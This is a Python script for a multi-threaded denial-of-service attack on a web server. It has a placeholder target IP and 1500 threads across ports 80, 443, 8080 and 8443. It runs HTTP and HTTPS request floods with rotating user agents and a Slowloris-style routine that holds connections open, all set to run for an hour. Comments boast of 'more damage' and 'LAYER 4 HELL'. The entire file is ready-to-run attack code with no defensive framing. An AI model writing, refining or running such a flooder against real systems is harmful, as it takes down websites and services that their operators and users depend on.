import requests
import threading
import random
import time
from fake_useragent import UserAgent

# --- TARGET CONFIG ---
TARGET_IP = "123.123.123.123"  # REPLACE WITH TARGET IP
TARGET_PORTS = [80, 443, 8080, 8443]  # Common web ports
THREAD_COUNT = 1500  # More threads = more damage
REQUEST_DELAY = 0.001  # Ultra-low delay
RUN_TIME = 3600  # 1 hour of runtime

# --- USER AGENTS & PATHS ---
ua = UserAgent()
paths = [
    "/", "/login", "/admin", "/api", "/wp-login.php",
    "/index.php", "/search", "/cart", "/checkout"
]

# --- SLOWLORIS HEADERS ---
slowloris_headers = {
    "User-Agent": ua.random,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive",
    "Keep-Alive": "900",
    "Content-Length": "1000000",
    "X-Random": f"{random.randint(1, 999999)}"
}

# --- HTTP FLOOD ---
def http_flood(ip, port):
    end_time = time.time() + RUN_TIME
    while time.time() < end_time:
        try:
            url = f"http://{ip}:{port}{random.choice(paths)}"
            headers = {"User-Agent": ua.random}
            requests.get(url, headers=headers, timeout=5)
            print(f"[SHUTDOWN] HTTP FLOOD: {url}")
        except:
            pass
        time.sleep(REQUEST_DELAY)

# --- HTTPS FLOOD ---
def https_flood(ip, port):
    end_time = time.time() + RUN_TIME
    while time.time() < end_time:
        try:
            url = f"https://{ip}:{port}{random.choice(paths)}"
            headers = {"User-Agent": ua.random}
            requests.get(url, headers=headers, timeout=5, verify=False)
            print(f"[SHUTDOWN] HTTPS FLOOD: {url}")
        except:
            pass
        time.sleep(REQUEST_DELAY)

# --- SLOWLORIS ATTACK ---
def slowloris(ip, port):
    end_time = time.time() + RUN_TIME
    while time.time() < end_time:
        try:
            url = f"http://{ip}:{port}/"
            s = requests.Session()
            s.get(url, headers=slowloris_headers, stream=True, timeout=1000)
            print(f"[SHUTDOWN] SLOWLORIS OPEN: {ip}:{port}")
            time.sleep(1000)  # Keep connection open
        except:
            pass

# --- MAIN ATTACK ---
def start_attack():
    print(f"[SHUTDOWN] UNLEASHING LAYER 4 HELL ON {TARGET_IP}!")
    for port in TARGET_PORTS:
        for _ in range(THREAD_COUNT // len(TARGET_PORTS)):
            threading.Thread(target=http_flood, args=(TARGET_IP, port)).start()
            threading.Thread(target=https_flood, args=(TARGET_IP, port)).start()
            threading.Thread(target=slowloris, args=(TARGET_IP, port)).start()

# --- RUN ---
if __name__ == "__main__":
    start_attack()

